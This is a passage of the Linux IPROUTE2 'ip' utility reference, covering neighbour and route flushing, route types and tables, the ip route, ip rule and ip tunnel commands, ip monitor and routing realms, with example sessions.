noarp --- the neighbour is valid, no attempts to check the entry will be made.

permanent --- it is noarp entry, but only administrator may remove the entry from neighbour table.

Link layer address is valid in all the states except for none, failed and incomplete.

IPv6 neighbours can be marked with the additional flag router, which means that that neighbour introduced itself as an IPv6 router.

Option -statistics provides some usage statistics,

kuznet@alisa~ $ ip -s n ls 193.233.7.254

193.233.7.254 dev eth0 lladdr 00000c763f85 ref 5 used 12/13/20 \

nud reachable

kuznet@alisa~ $

Here ref is number of users of this entry, and used is a triplet of time intervals in seconds separated by slashes. The triplet of numbers is coded as {used/confirmed/updated}. In this example they show that

The entry was used 12 seconds ago.

The entry was confirmed 13 seconds ago.

The entry was updated 20 seconds ago.

ip neighbour flush --- flush neighbour entries.

Abbreviations: flush, f.

This commands flushes the neighbour tables. Entries may be selected to flush by various criteria.

This command has the same arguments as show. Note that it will not run when no arguments are given, and that the default neighbour states to be flushed do not include permanent or noarp.

With the option -statistics the command becomes verbose and prints out the number of deleted neighbours and number of rounds made in flushing the neighbour table. If the option is given twice, ip neigh flush also dumps all the deleted neighbours in the format described in the previous subsection.

netadm@alisa~ # ip -s -s n f 193.233.7.254

193.233.7.254 dev eth0 lladdr 00000c763f85 ref 5 used 12/13/20 \

nud reachable

***Round 1, deleting 1 entries***

***Flush is complete after 1 round***



ip route - routing table management.

Abbreviations: route, ro, r.

This command manages the route entries within the kernel routing tables. The kernel routing tables keep information about protocol paths to other networked nodes.

Each route entry has a key consisting of the protocol prefix, which is the pairing of the network address and network mask length, and optionally the Type of Service (TOS) value. An IP packet matches to the route if the highest bits of the packets destination address are equal to the route prefix at least up to the prefix length and if the TOS of the route is zero or equal to TOS of the packet.

If several routes match to the packet, the following pruning rules are used to select the best one:

1.	The longest matching prefix is selected, all shorter ones are dropped.

2.	If the TOS of some route with the longest prefix is equal to TOS of the packet then routes with different TOS are dropped.

3.	If no exact TOS match was found and routes with TOS=0 exist, the rest of the routes are pruned. Otherwise the route lookup fails.

4.	If several routes remain after steps 1-4 have been tried then routes with the best preference value are selected.

5.	If we still have several routes then the first of them is selected.

Note the ambiguity of action 5. Unfortunately, Linux historically allowed such a bizarre situation. The sense of the word "the first" depends on the literal order in which the routes were added to the routing table and it is practically impossible to maintain a bundle of such routes in any such order.

For simplicity we will limit ourselves to the case wherein such a situation is impossible and routes are uniquely identified by the triplet of {prefix, tos, preference}. Using the ip command for route creation and manipulation makes it impossible to create such non-unique routes.

One useful exception to this rule is the default route on non-forwarding hosts. It is "officially" allowed to have several fallback routes in cases when several routers are present on directly connected networks. In this case Linux performs "dead gateway detection" as controlled by neighbour unreachability detection and references from the transport protocols to select the working router thus the ordering of the routes is not essential. However in this specific case it is not recommended that you manually fiddle with default routes but instead use the Router Discovery protocol. Actually Linux IPv6 does not even allow user level applications access to default routes.

Of course the route selection steps above are not performed in exactly this sequence. The routing table in the kernel is kept in a data structure which allows achieving the final result with minimal cost. Without depending on any particular routing algorithm implemented in the kernel we can summarize the sequence above as: Route is identified by triplet {prefix,tos,preference} key which uniquely locates the route in the routing table.

Route attributes: Each route key refers to a routing information record. The routing information record contains the data required to deliver IP packets, such as output device and next hop router, and additional optional attributes, such as path MTU or the preferred source address for communicating to that destination.

Route types: It is important that the set of required and optional attributes depends on the route type. The most important route type is a unicast route which describes real paths to another hosts. As a general rule, common routing tables only contain unicast routes. However other route types with different semantics do exist. The full list of types understood by the Linux 2.2 kernel is:

unicast --- the route entry describes real paths to the destinations covered by route prefix.

unreachable --- these destinations are unreachable; packets are discarded and the ICMP message host unreachable (ICMP Type 3 Code 1) is generated. The local senders get error EHOSTUNREACH.

blackhole --- these destinations are unreachable; packets are silently discarded. The local senders get error EINVAL.

prohibit --- these destinations are unreachable; packets are discarded and the ICMP message communication administratively prohibited (ICMP Type 3 Code 13) is generated. The local senders get error EACCES.

local --- the destinations are assigned to this host, the packets are looped back and delivered locally.

broadcast --- the destinations are broadcast addresses, the packets are sent as link broadcasts.

throw --- special control route used together with policy rules. If a throw route is selected then lookup in this particular table is terminated pretending that no route was found. Without any policy routing it is equivalent to the absence of the route in the routing table, the packets are dropped and ICMP message net unreachable (ICMP Type 3 Code 0) is generated. The local senders get error ENETUNREACH.

nat --- special NAT route. Destinations covered by the prefix are considered as dummy (or external) addresses, which require translation to real (or internal) ones before forwarding. The addresses to translate to are selected with the attribute via.

anycast --- (not implemented) the destinations are anycast addresses assigned to this host. They are mainly equivalent to local addresses with the difference that such addresses are invalid to be used as the source address of any packet.

multicast --- special type, used for multicast routing. It does not present in normal routing tables.

Route tables: Linux can place routes within multiple routing tables identified by a number in the range from 1 to 255 or by a name taken from the file /etc/iproute2/rt_tables. By default all normal routes are inserted to the table main (ID 254) and the kernel uses only this table when calculating routes.

Actually another routing table always exists which is invisible but even more important. It is the local table (ID 255). This table consists of routes for local and broadcast addresses. The kernel maintains this table automatically and administrators should not modify it and do not even need to look at it in normal operation.

The multiple routing tables come into play when policy routing is used. In policy routing the routing table identifier becomes effectively one more parameter added to the key triplet {prefix,tos,preference}. Thus under policy routing the route is obtained by {tableid,key triplet} identifing the route uniquely. So you can have several identical routes in different tables that will not conflict as we had mentioned above in in the description of "the first" mechanism.

ip route add --- add new route

ip route change --- change route

ip route replace --- change route or add new one.

Abbreviations: add, a; change, chg; replace, repl.

Arguments:

to PREFIX or to TYPE PREFIX (default) --- destination prefix of the route. If TYPE is omitted, ip assumes type unicast. Another values of TYPE are listed above. PREFIX is IPv4 or IPv6 address optionally followed by slash and prefix length. If the length of the prefix is missing, ip assumes full-length host route. Also there is one special PREFIX --- default --- which is equivalent to IP 0/0 or to IPv6 /0.

tos TOS or dsfield TOS --- Type Of Service (TOS) key. This key has no mask associated and the longest match is understood as first, compare TOS of the route and of the packet, if they are not equal, then the packet still may match to a route with zero TOS. TOS is either 8bit hexadecimal number or an identifier from /etc/iproute2/rt_dsfield.

metric NUMBER or preference NUMBER --- preference value of the route. NUMBER is an arbitrary 32bit number.

table TABLEID --- table to add this route. TABLEID may be a number or a string from the file /etc/iproute2/rt_tables. If this parameter is omitted, ip assumes table main, with exception of local, broadcast and nat routes, which are put to table local by default.

dev NAME --- the output device name.

via ADDRESS --- the address of nexthop router. Actually, the sense of this field depends on route type. For normal unicast routes it is either true nexthop router or, if it is a direct route installed in BSD compatibility mode, it can be a local address of the interface. For NAT routes it is the first address of block of translated IP destinations.

src ADDRESS --- the source address to prefer using when sending to the destinations covered by route prefix. This address must be defined on a local machine interface. This will come into play when routes and rules are combined with the masquerade rules of the ipchains firewall we discuss later.

realm REALMID --- the realm which this route is assigned to. REALMID may be a number or a string from the file /etc/iproute2/rt_realms.

mtu MTU or mtu lock MTU --- the MTU along the path to destination. If modifier lock is not used, MTU may be updated by the kernel due to Path MTU Discovery. If the modifier lock is used then no path MTU discovery will be performed and all the packets will be sent without the DF bit set for the IPv4 case or fragmented to the MTU for the IPv6 case.

window NUMBER --- the maximal advertised window for TCP to these destinations measured in bytes. This parameter limits the maximal data bursts our TCP peers are allowed to send to us.

rtt NUMBER --- the initial RTT (``Round Trip Time) estimate. Actually, in Linux 2.2 and 2.0 it is not RTT but the initial TCP retransmission timeout. The kernel forgets it as soon as it receives the first valid ACK from peer. Alas, this means that this attribute affects only the connection retry rate and is hence useless.

nexthop NEXTHOP --- nexthop of multipath route. NEXTHOP is a complex value with its own syntax as follows:

via ADDRESS is nexthop router.


dev NAME is output device.


weight NUMBER is weight of this element of multipath route

reflecting its relative bandwidth or quality.


scope SCOPE_VAL --- scope of the destinations covered by the route prefix. SCOPE_VAL may be a number or a string from the file /etc/iproute2/rt_scopes. If this parameter is omitted, ip assumes scope global for all gatewayed unicast routes, scope link for direct unicast routes and broadcasts and scope host for local routes.

protocol RTPROTO --- routing protocol identifier of this route. RTPROTO may be a number or a string from the file /etc/iproute2/rt_protos. If the routing protocol ID is not given ip assumes the protocol is boot. IE. This route has been added by someone who does not understand what they are doing. Several of these protocol values have a fixed interpretation.

redirect --- route was installed due to ICMP redirect.


kernel --- route was installed by the kernel during autoconfiguration.


boot --- route was installed during bootup sequence. If a routing daemon will start, it will purge all of them. This is the value assigned to manually inserted routes that do not have a protocol specified.


static --- route was installed by administrator to override dynamic routing. Routing daemon(s) will respect them and advertise them if it is so configured.


ra --- route was installed by Router Discovery protocol.


Note that the rest of values are not reserved and administrator is free to assign or not assign protocol tags. Routing daemons at least should take care of setting some unique protocol values for themselves such as they are assigned in rtnetlink.h or in the rt_protos database.


onlink --- pretend that the nexthop is directly attached to this link, even if it does match any interface prefix. One application of this option may be found in ip tunnels between dissimilar addresses.

equalize --- allow packet by packet randomization on multipath routes. Without this modifier route will be frozen to one selected nexthop, so that load splitting will occur only on per-flow base. Equalize works only if the appropriate kernel configuration option is chosen or if the kernel is patched.

Two more commands, prepend and append do exist. Prepend does the same thing as the classic route add command by adding the route even if another route to the same destination already exists. The opposite case is append which adds the route to the end of the list. We strongly reccommend that you avoid using these commands.

Unfortunately, IPv6 currently only understands the append command correctly, all the rest of the set translating to append. Certainly, this will change in the future.

Examples:

Add a plain route to network 10.0.0/24 via gateway 193.233.7.65

ip route add 10.0.0/24 via 193.233.7.65

change it to a direct route via device dummy

ip ro chg 10.0.0/24 via 193.233.7.65 dev dummy

Add default multipath route splitting load between ppp0 and ppp1

ip route add default scope global nexthop dev ppp0 nexthop dev ppp1

Note the scope value which is not necessary but prompts the kernel that this route is gatewayed rather than direct. Actually, if you know the addresses of the remote endpoints it would be better to specify them using the parameter via.

NAT the address 192.203.80.144 to 193.233.7.83 before forwarding

ip route add nat 192.203.80.142 via 193.233.7.83

Note that the reverse NAT translation is setup with policy rules as described in the policy routing section.

ip route delete

Abbreviations: delete, del, d.

ip route del has the same arguments as ip route add but their semantics are a bit different.

Key values (dest, tos, preference and table) select the route to delete. If any optional attributes are present, ip verifies that they coincide with attributes of the route to delete. If no route with given key and attributes is found then ip route del fails.

Linux kernel 2.0 had the ability to delete a route selected only by the prefix address while ignoring its netmask. This option does not exist anymore due to the ambiguous nature of the selection. If you wish to have such functionality then look at the ip route flush command which provides a richer set of capabilities.

Examples:

Delete the multipath route created by the add example previously

ip route del default scope global nexthop dev ppp0 nexthop dev ppp1

ip route show

Abbreviations: show, list, sh, ls, l.

This format of the command allows viewing the routing tables contents and looking at route(s) as selected by some criteria.

Arguments:

to SELECTOR (default) --- select routes only from the given range of destinations. SELECTOR has optional modifiers (root, match or exact) and a prefix.

root PREFIX selects routes with prefixes not shorter than PREFIX. IE: root 0/0 selects all the routing table.

match PREFIX selects routes with prefixes not longer than PREFIX. match 10.0/16 selects 10.0/16, 10/8 and 0/0, but it does not select 10.1/16 and 10.0.0/24.

exact PREFIX (or just PREFIX) selects routes exactly with this prefix.

If none of these options are present then the ip command assumes root 0/0 which lists the entire table.

tos TOS or dsfield TOS --- Select only routes with given TOS.

table TABLEID --- Show routes from this table(s). Default setting is to show table main (ID 254). TABLEID may be either ID of a real table or one of the special values:



all --- list all the tables.



cache --- dump routing cache.



IPv6 has only a single table, however splitting into main, local, and cache is emulated by the ip utility.



cloned or cached --- list cloned routes which are routes dynamically forked off of other routes because some route attribute (like MTU) was updated. It is equivalent to table cache.



from SELECTOR --- the same syntax as to SELECTOR but bounds the source address range rather than the destination. Note that the from option only works with cloned routes.

protocol RTPROTO --- list only routes of this protocol.

scope SCOPE_VAL --- list only routes with this scope.

type TYPE --- list only routes of this type.

dev NAME --- list only routes going via this device.

via PREFIX --- list only routes going via selected by PREFIX nexthop routers.

src PREFIX --- list only routes with preferred source addresses selected by PREFIX.

realm REALMID or realms FROMREALM/TOREALM --- list only routes with these realms.



Using this command is best explained by running through some examples.

Example: Let us count the routes of protocol gated/bgp on a router

kuznet@amber~ $ ip route list proto gated/bgp | wc

1413 9891 79010

kuznet@amber~ $

To count size of routing cache we have to use option -o, because cached attributes can take more than one line of the output

kuznet@amber~ $ ip -o route list cloned | wc

159 2543 18707

kuznet@amber~ $

The output of this command consists of per route records separated by line feeds. However, some records may consist of more than one line particularly when the route is cloned or you have requested additional statistics. If the option -o is given, then line feeds separating lines inside records are replaced with backslash sign.

The output has the same syntax as arguments given to ip route add, so that it can be understood easily.

kuznet@amber~ $ ip route list 193.233.7/24

193.233.7.0/24 dev eth0 proto gated/conn scope link \

src 193.233.7.65 realms inr.ac

kuznet@amber~ $

If you list cloned entries the output contains other attributes, which are evaluated during route calculation and updated during route lifetime. The example of the output is:

kuznet@amber~ $ ip route list 193.233.7.82 table cache

193.233.7.82 from 193.233.7.82 dev eth0 src 193.233.7.65 \

realms inr.ac/inr.ac

cache <src-direct,redirect> mtu 1500 rtt 300 iif eth0

193.233.7.82 dev eth0 src 193.233.7.65 realms inr.ac

cache mtu 1500 rtt 300

kuznet@amber~ $

This route looks a bit strange, does it not? Did you notice that this is the path from 193.233.7.82 back to 193.233.82? In the section on ip route get you will see how this route is created.

The second line which starts with the word cache shows the additional attributes which normal routes do not possess. The cache flags contained within the angle brackets are:

local --- packets are delivered locally. It stands for loopback unicast routes, for broadcast routes, and for multicast routes if this host is member of the corresponding group.

reject --- the path is bad. Any attempt to use it results in error. See attribute error below.

mc --- the destination is multicast.

brd --- the destination is broadcast.

src-direct --- the source is on a directly connected interface.

redirected --- the route was created by an ICMP Redirect.

redirect --- packets going via this route will trigger ICMP redirect.

fastroute --- route is eligible to be used for fastroute.

equalize --- make packet by packet randomization along this path.

dst-nat --- destination address requires translation.

src-nat --- source address requires translation.

masq --- source address requires masquerading.

notify --- (not implemented) change/deletion of this route will trigger RTNETLINK notification.

The following are optional attributes that may be present:

error --- on reject routes this is the error code returned to local senders when they try to use this route. These error codes are translated to ICMP error codes sent to remote senders according to the rules described above in the subsection devoted to route types.

expires --- this entry will expire after this timeout.

iif --- the packets for this path are expected to arrive on this interface.

Giving the option -statistics will show further information about this route:

users --- number of users of this entry.

age --- shows when this route was used last time.

used --- number of lookups of this route since its creation.

ip route flush - allows group deletion of routes

Abbreviations: flush, f.

This command allows flushing routes as selected by some criteria.

The arguments have the same syntax and semantics as the arguments of ip route show but the routing tables are purged rather than listed. The only difference is the default action performed. Where the ip route show command dumps the main IP routing table, ip route flush prints the help page. The reason for this difference does not require an explanation does it?

With the option -statistics the command becomes verbose and prints out the number of deleted routes and the number of rounds needed to flush the routing table. If the option is given twice then ip route flush also dumps all deleted routes in the format described in the previous subsection.

Examples:

The first example flushes all the gatewayed routes from main table such as after a routing daemon crash.

netadm@amber~ # ip -4 ro flush scope global type unicast

This option deserved to be put into the scriptlet routef available within the IPROUTE2 utility distribution. This option was described in the route(8) man page as borrowed from BSD but was never implemented in Linux.

The second example is flushing all IPv6 cloned routes:

netadm@amber~ # ip -6 -s -s ro flush cache

3ffe2400220affffef4c5d1 via 3ffe2400220affffef4c5d1 \

dev eth0 metric 0

cache used 2 age 12sec mtu 1500 rtt 300

3ffe2400280adfffeb78034 via 3ffe2400280adfffeb78034 \

dev eth0 metric 0

cache used 2 age 15sec mtu 1500 rtt 300

3ffe2400280c8fffe595bcc via 3ffe2400280c8fffe595bcc \

dev eth0 metric 0

cache users 1 used 1 age 23sec mtu 1500 rtt 300

3ffe2400012a0ccfffe661878 via 3ffe2400012a0ccfffe661878 \

dev eth1 metric 0

cache used 2 age 20sec mtu 1500 rtt 300

3ffe240001a0020fffe71fb30 via 3ffe240001a0020fffe71fb30 \

dev eth1 metric 0

cache used 2 age 33sec mtu 1500 rtt 300

ff021 via ff021 dev eth1 metric 0

cache users 1 used 1 age 45sec mtu 1500 rtt 300

***Round 1, deleting 6 entries***

***Flush is complete after 1 round***

netadm@amber~ # ip -6 -s -s ro flush cache

Nothing to flush.

The third example is flushing BGP routing tables after gated death.

netadm@amber~ # ip ro ls proto gated/bgp wc

1408 9856 78730

netadm@amber~ # ip -s ro f proto gated/bgp

***Round 1, deleting 1408 entries***

***Flush is complete after 1 round***

netadm@amber~ # ip ro f proto gated/bgp

Nothing to flush.

netadm@amber~ # ip ro ls proto gated/bgp


ip route get - obtain route pathing

Abbreviations: get, g.

This command gets a single route to a destination and prints its contents exactly as kernel sees it.

Arguments:

to ADDRESS (default) --- destination address.

from ADDRESS --- source address.

tos TOS or dsfield TOS --- Type Of Service.

iif NAME --- device, which this packet is expected to arrive from.

oif NAME --- enforce output device, which this packet will be routed out.

connected --- if no source address (option from) was given, relookup the route with the source address set to the preferred address as received from the first lookup. If policy routing is used this may be a different route.

Note that this operation is not equivalent to ip route show. ip route show shows the existing routes, ip route get resolves them and creates new clones if necessary. Essentially, ip route get is equivalent to actually sending a packet along this path. If the argument iif is not given then the kernel creates a route to output packets towards requested destination. This is equivalent to pinging the destination then running ip route list cache but in the case of ip route get no packets are actually sent. With the argument iif present the kernel pretends that a packet has arrived from this interface and searches for a path to forward the packet. This command outputs routes in the same format as ip route ls.

Examples:

Find route to output packets to 193.233.7.82:

kuznet@amber~ $ ip route get 193.233.7.82

193.233.7.82 dev eth0 src 193.233.7.65 realms inr.ac

cache mtu 1500 rtt 300

kuznet@amber~ $

Find route to forward packets arriving on eth0 from 193.233.7.82 and destined to 193.233.7.82:

kuznet@amber~ $ ip route get 193.233.7.82 from 193.233.7.82 iif eth0

193.233.7.82 from 193.233.7.82 dev eth0 src 193.233.7.65 \

realms inr.ac/inr.ac

cache <src-direct,redirect> mtu 1500 rtt 300 iif eth0

kuznet@amber~ $

This is the operation that created the funny route in the examples to ip route list with 193.233.7.82 looped back to 193.233.7.82. Note the redirect flag present on the output.

Find multicast route for packets arriving on eth0 from host 193.233.7.82 and destined to multicast group 224.2.127.254 assuming that a multicast routing daemon is running such as in this case we are running pimd.

kuznet@amber~ $ ip route get 224.2.127.254 from 193.233.7.82 iif eth0

multicast 224.2.127.254 from 193.233.7.82 dev lo \

src 193.233.7.65 realms inr.ac/cosmos

cache <mc> iif eth0 Oifs eth1 pimreg

kuznet@amber~ $

This route differs from the ones seen before. It contains a normal part and a multicast part. The normal part is used to deliver or not deliver the packet to local IP listeners. In this case the router is not acting as a member of the multicast group so the route has no local flag and only forwards packets. The output device for such entries is always loopback. The multicast part consists of an additional Oifs list showing the output interfaces.

Now it is time for a more complicated example. Let us add an invalid gatewayed route for a destination which is really directly connected.

netadm@alisa~ # ip route add 193.233.7.98 via 193.233.7.254

netadm@alisa~ # ip route get 193.233.7.98

193.233.7.98 via 193.233.7.254 dev eth0 src 193.233.7.90

cache mtu 1500 rtt 3072


and probe it with ping

netadm@alisa~ # ping -n 193.233.7.98

PING 193.233.7.98 (193.233.7.98) from 193.233.7.90 56 data bytes

From 193.233.7.254 Redirect Host(New nexthop 193.233.7.98)

64 bytes from 193.233.7.98 icmp_seq=0 ttl=255 time=3.5 ms

From 193.233.7.254 Redirect Host(New nexthop 193.233.7.98)

64 bytes from 193.233.7.98 icmp_seq=1 ttl=255 time=2.2 ms

64 bytes from 193.233.7.98 icmp_seq=2 ttl=255 time=0.4 ms

64 bytes from 193.233.7.98 icmp_seq=3 ttl=255 time=0.4 ms

64 bytes from 193.233.7.98 icmp_seq=4 ttl=255 time=0.4 ms

^C

--- 193.233.7.98 ping statistics ---

5 packets transmitted, 5 packets received, 0% packet loss

round-trip min/avg/max = 0.4/1.3/3.5 ms



What occured? The router at 193.233.7.254 understood that we have a much better path to the destination and sent us an ICMP redirect message. We now retry ip route get to see what we have in our routing tables.

netadm@alisa~ # ip route get 193.233.7.98

193.233.7.98 dev eth0 src 193.233.7.90

cache <redirected> mtu 1500 rtt 3072



ip rule --- routing policy database management.

Abbreviations: rule, ru.

Rules in routing policy database controlling route selection algorithm.

Classic routing algorithms used in the Internet make routing decisions based only on the destination address of packets and in theory, but not in practice, on the TOS field. In some circumstances we want to route packets differently depending not only on the destination addresses, but also on other packet fields such as source address, IP protocol, transport protocol ports or even packet payload. This task is called "policy routing".

"policy routing" != "routing policy"

"policy routing" = "cunning routing"

"routing policy" = "routing tactics" or "routing plan"

To solve this task the conventional destination based routing table, ordered according to the longest match rule, is replaced with the "routing policy database" or RPDB, which selects the appropriate route through execution of some set of rules. These rules may have many keys of different natures and therefore they have no natural ordering excepting that which is imposed by the network administrator. In Linux the RPDB is a linear list of rules ordered by a numeric priority value. The RPDB explicitly allows matching packet source address, packet destination address, TOS, incoming interface (which is packet metadata, rather than a packet field), and using fwmark values for matching IP protocols and transport ports.

Each routing policy rule consists of a selector and an action predicate. The RPDB is scanned in the order of increasing priority with the selector of each rule applied to the source address, destination address, incoming interface, tos, and fwmark. If the selector matches the packet the action is performed. The action predicate may return success in which case the rule output provides either a route or a failure indication and RPDB lookup is then terminated. Otherwise, the RPDB program continues on to the next rule.

What is the action semantically? The natural action is to select the nexthop and output device. This is the way a packet path route is selected by Cisco IOS, let us call it "match & set". In Linux the approach is more flexible as the action includes lookups in destination-based routing tables and selecting a route from these tables according to classic longest match algorithm. The "match & set" approach then becomes the simplest case of Linux route selection realized when the second level routing table contains a single default route. Remember that Linux supports multiple routing tables managed with ip route command.

At startup the kernel configures a default RPDB consisting of three rules:

1.	Priority 0: Selector = match anything

Action = lookup routing table local (ID 255).

The table local is the special routing table containing high priority control routes for local and broadcast addresses.

Rule 0 is special, it cannot be deleted or overridden.

2.	Priority 32766: Selector = match anything

Action = lookup routing table main (ID 254)

The table main is the normal routing table containing all non-policy routes. This rule may be deleted or overridden with other rules.

3.	Priority 32767: Selector = match anything

Action = lookup routing table default (ID 253).

The table default is empty and reserved for post-processing if previous default rules did not select the packet. This rule also may be deleted.

Do not mix routing tables and rules. Rules point to routing tables, several rules may refer to one routing table and some routing tables may have no rules pointing to them. If you delete all the rules referring to a table then the table is not used but still exists. A routing table will disappear only after all the routes contained within it are deleted.

Rule attributes: Each RPDB entry has additional attributes attached. Each rule has a pointer to some routing table. NAT and masquerading rules have the attribute to select a new IP address to translate/masquearade. Additionally rules have some of the optional attributes which routes have such as realms. These values do not override those contained in routing tables, they are used only if the route did not select any of those attributes.

Rule types: The RPDB may contain rules of the following types.

unicast --- the rule prescribes returning the route found in the routing table referenced by the rule.

blackhole --- the rule prescribes to drop packet silently.

unreachable --- the rule prescribes generating the error "Network is unreachable".

prohibit --- the rule prescribes generating the error "Communication is administratively prohibited".

nat --- the rule prescribes translating the source address of the IP packet to some other value.



ip rule add --- insert new rule

Abbreviations: add, a; delete, del, d.

Arguments:

type TYPE (default) --- type of this rule. The list of valid types was given in the previous subsection.

from PREFIX --- select source prefix to match.

to PREFIX --- select destination prefix to match.

iif NAME --- select incoming device to match. If the interface is loopback, the rule matches only packets originated by this host. It means that you may create separate routing tables for forwarded and local packets and, hence, completely segregate them.

tos TOS or dsfield TOS --- select TOS value to match.

fwmark MARK --- select value of fwmark to match.

priority PREFERENCE --- priority of this rule. Each rule should have an explicitly set unique priority value. Priority is an unsigned 32 bit number thus we have 4294967296 possible rules.



WARNING!



For historical reasons ip rule add does not require any priority value and allows the priority value to be non-unique. If the user had not supplied a priority value then one was assigned by the kernel.If the user requested creating a rule with a priority value which already existed then the kernel did not reject the request and added the new rule before all old rules of the same priority. This is a mistake in the current design, nothing more. It should be fixed by the time you read this so please do not rely on this feature. You should always use explicit priorities when creating rules.



table TABLEID --- routing table identifier to lookup if the rule selector matches.

realms FROM/TO --- Realms to select if the rule matched and routing table lookup succeeded. Realm TO is used only if the route returned did not select any realm.

nat ADDRESS --- The base of IP address block to translate source address. The ADDRESS may be either the start of a block of NAT addresses as selected by NAT routes, a local host address, or even zero. In the last two cases the Linux router does not NAT translate the packets but masquerades them to this address.

Changes to the RPDB made with these commands do not become active immediately. You should run ip route flush cache to flush out the routing cache after inserting rules.

Examples:

Route packets with source addresses from 192.203.80/24 according to routing table inr.ruhep

ip rule add from 192.203.80.0/24 table inr.ruhep prio 220

Translate packet source 193.233.7.83 to 192.203.80.144 and route it according to table #1 (Table #1 is defined in /etc/iproute/rt_tables as inr.ruhep)

ip rule add from 193.233.7.83 nat 192.203.80.144 table 1 prio 320

Delete unused default rule

ip rule del prio 32767

ip rule show - list policy rules

Abbreviations: show, list, sh, ls, l.

Good news - this is the only command which has no arguments. Here is the example:

kuznet@amber~ $ ip rule list

0 from all lookup local

200 from 192.203.80.0/24 to 193.233.7.0/24 lookup main

210 from 192.203.80.0/24 to 192.203.80.0/24 lookup main

220 from 192.203.80.0/24 lookup inr.ruhep realms inr.ruhep/radio-msu

300 from 193.233.7.83 to 193.233.7.0/24 lookup main

310 from 193.233.7.83 to 192.203.80.0/24 lookup main

320 from 193.233.7.83 lookup inr.ruhep map-to 192.203.80.144

32766 from all lookup main



In the first position the rule priority value stands followed by a colon. Then the selectors follow with each key prefixed by the keyword used to create the rule.

The keyword lookup is followed by the routing table identifier as recorded in the file /etc/iproute2/rt_tables.

If the rule does NAT, as in rule #320, it is shown by the keyword map-to followed by the start of the block of addresses to map.

The sense of this example is pretty simple. The prefixes 192.203.80.0/24 and 193.233.7.0/24 form an internal network but each prefix is routed differently. Additionally, the host 193.233.7.83 is translated to another prefix as 192.203.80.144 when talking to the outer world.

ip tunnel - ip tunnelling configuration

Abbreviations: tunnel, tunl.

The tunnel objects are tunnels encapsulating packets within IPv4 packets and sending them over the IP infrastructure.

ip tunnel add - creating tunnels

Abbreviations: add, a

Arguments:

name NAME (default) --- select tunnel device name.

mode MODE --- set tunnel mode. Three modes are available: ipip, sit, gre

remote ADDRESS --- set remote endpoint of the tunnel.

local ADDRESS --- set fixed local address for tunneled packets. It must be an address on another interface of this host.

ttl N --- set fixed TTL N on tunneled packets. N is number in the range 1--255. 0 is special value, meaning that packets inherit TTL value. Default value is inherit.

tos TOS or dsfield TOS --- set fixed TOS on tunneled packets. Default value is inherit.

dev NAME --- bind tunnel to device NAME, so that tunneled packets will be routed only via this device and will not able to escape to another device, when route to endpoint changes.

nopmtudisc --- disable Path MTU Discovery on this tunnel. It is enabled by default. Note that a fixed ttl is incompatible with this option. A tunnel with fixed ttl always performs pmtu discovery.

key K, ikey K, okey K --- (GRE only) use keyed GRE with key K. K is either number or IP address-like dotted quad. The parameter key sets key to use in both directions, ikey and okey allow setting different keys for input and output.

csum, icsum, ocsum --- (GRE only) checksum tunneled packets. The flag ocsum orders checksumming outgoing packets, icsum requires that all the input packets have a correct checksum. csum is equivalent to the combination "icsum ocsum".

seq, iseq, oseq --- (GRE only) serialize packets. The flag oseq enables sequencing outgouing packets, iseq requires that all the input packets were serialized. seq is equivalent to the combination "iseq oseq".

I think this option does not work. At least, I did not test it, did not debug it and even do not understand, how it is supposed to work and for what purpose Cisco planned to use it. Do not use it. -- Alexey



Examples:

Create pointopoint IPv6 tunnel with maximal TTL of 32.

ip tunl add Cisco mode sit remote 192.31.7.104 local 192.203.80.142 ttl 32

ip tunnel show - list tunnel attributes

Abbreviations: show, list, sh, ls, l.

Example:


kuznet@amber~ $ ip tunl ls Cisco

Cisco: ipv6/ip remote 192.31.7.104 local 192.203.80.142 ttl 32



The line starts with the tunnel device name terminated by a colon then the tunnel mode follows. The parameters of the tunnel are listed with the same keywords which were used at tunnel creation.

kuznet@amber~ $ ip -s tunl ls Cisco

Cisco ipv6/ip remote 192.31.7.104 local 192.203.80.142 ttl 32

RX Packets Bytes Errors CsumErrs OutOfSeq Mcasts

12566 1707516 0 0 0 0

TX Packets Bytes Errors DeadLoop NoRoute NoBufs

13445 1879677 0 0 0 0



Essentially these numbers are the same as those printed using ip -s link show but the tags are different to reflect tunnel specific features. These features are:

CsumErrs --- total number of packets dropped because of checksum failures for GRE tunnel with enabled checksumming.

OutOfSeq --- total number of packets dropped because they arrived out of sequence for GRE tunnel with enabled serialization.

Mcasts --- total number of multicast packets, received on broadcast GRE tunnel.

DeadLoop --- total number of packets, which were not transmitted because tunnel is looped back to itself.

NoRoute --- total number of packets, which were not transmitted because there is no IP route to remote endpoint.

NoBufs --- total number of packets, which were not transmitted because kernel failed to allocate buffer.

ip monitor and rtmon --- route state monitoring

The ip utility allows monitoring the state of devices, addresses, and routes continuously. This option has a different format in that the command monitor is first on the command line followed by the object list.

ip monitor [ file FILE ] [ all OBJECT-LIST ]

OBJECT-LIST is the list of object types which we want to monitor. It may contain link, address, and route. If no file argument is given, ip opens RTNETLINK, listens to it and dumps the state changes in the format as described in the previous sections.

If a file name is given ip does not listen to RTNETLINK but opens the file which is assumed to contain RTNETLINK messages saved in binary format and dumps them. Such a history file can be generated with the utility rtmon. This utility has a command line syntax similar to ip monitor. Ideally, rtmon should be started before the first network configuration command is issued. It is possible to start rtmon at any time as it prepends the history with the system state snapshot dumped at the moment of startup.

rtacct - route realms and policy propagation

On routers using OSPF ASE or especially the BGP protocol, the routing tables may be huge. If we want to classify or account for the packets per route, we will have to keep lots of information. Even worse, if we want to distinguish the packets not only by their destination, but also by their source, the task presents a quadratic complexity and its solution is physically impossible.

One approach for propagating the policy from routing protocols to the forwarding engine has been proposed. Essentially, Cisco Policy Propagation via BGP is based on the fact that dedicated routers have the entire RIB (Routing Information Base) close to forwarding engine so that policy routing rules can check all the route attributes including ASPATH information and community strings.

Within the Linux architecture where we have a split RIB as maintained by user level daemon, and the kernel based FIB (Forwarding Information Base), we cannot allow such a simplistic approach.

Fortunately there exists another solution allowing an even more flexible policy with rich semantics. Routes can be clustered together in user space based on their attributes. IE: A BGP router knows the route ASPATH or its community whereas an OSPF router knows the route tag or its area. A network administrator adding routes manually knows the nature of those routes. Providing that the number of such aggregates, which we call realms, is low, the task of full classification both by source and destination becomes quite manageable.

So each route may be assigned to a realm. It is assumed that this identification is made by a routing daemon, but static routes may also be assigned manually through ip route.

Currently there exists a patch to gated allowing it to classify routes to realms over all the set of policy rules. This classification is implemented within gated by prefix, ASPATH, origin, tag, etc.

To facilitate this construction in the case when the routing daemon is not aware of realms, missing realms may be completed with routing policy rules.

For each packet the kernel calculates the tuple of realms, source realm and destination realm, using the following algorithm:

